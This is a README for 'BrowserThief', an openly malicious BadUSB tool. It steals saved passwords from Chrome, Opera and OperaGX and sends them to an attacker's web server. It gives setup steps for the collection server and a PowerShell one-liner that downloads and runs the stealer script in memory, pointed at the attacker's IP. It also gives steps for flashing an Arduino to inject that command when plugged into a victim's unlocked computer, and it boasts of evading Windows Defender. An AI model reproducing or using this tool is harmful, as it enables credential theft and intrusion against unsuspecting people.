# BrowserThief
All in one Rubber Ducky/BadUSB that runs a powershell script to extract and steal browser-saved passwords and stash them at your Flask web server. It currently extract passwords from **Opera/OperaGX/Chrome**, I will be adding support for more browsers like Firefox soon!
<br/><br/>

<p align="center">
<img src="test/POV.gif?raw=true" width="800">
</p>
<br/>

## Features
- The powershell script runs in-memory and avoids writing to disk which evades Windows Defender detection
- Powershell execution policy doesn't affect it whatsoever
- Includes an arduino RubberDucky script that runs in less than 2 seconds
- Extracts Passwords from all Chrome Profiles, Opera and OperaGX
- Will be adding Firefox soon
<br/><br/>
## Setup

- Setup the web server that catches the passwords

```console
foo@bar:~$ sudo apt install docker.io
```

```console
foo@bar:~$ git clone https://github.com/RobinHirst11/BrowserThief
```

```console
foo@bar:~$ cd BrowserThief/Web
```

```console
foo@bar:~$ sudo bash build-docker.sh
```


## Instructions
- finish [Setup](https://github.com/RobinHirst11/BrowserThief#Setup) first!
- simply run the powershell script 
```powershell
iex (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/RobinHirst11/BrowserThief/main/BrowserThief.ps1');pumpndump -hq http://<Your-IP>:1337;exit
```
- Or you can use the rubber ducky for stealth/speed
	- Needs an Arduino that supports `<Keyboard.h>` (Nano, Leonardo)
	- Install Arduino IDE from their [website](https://wiki-content.arduino.cc/en/software)
	- Open `RubberDuckyScript.ino` using the IDE and replace `https://dump.silvercryptor.xyz` with your IP, check out [Setup](https://github.com/RobinHirst11/BrowserThief#Setup) to setup the Web server
	- Compile and upload the script to the arduino
	- Insert the usb to the victim's computer (needs to be unlocked)
	- Profit 💰💰💰


## PoC

### Victim POV
Just plug your bad usb and watch the magic
<p align="center">
<img src="test/victim.gif?raw=true" width="800">
</p>
<br/>

### Attacker POV
<p align="center">
<img src="test/attacker.gif?raw=true" width="800">
</p>

<br/>
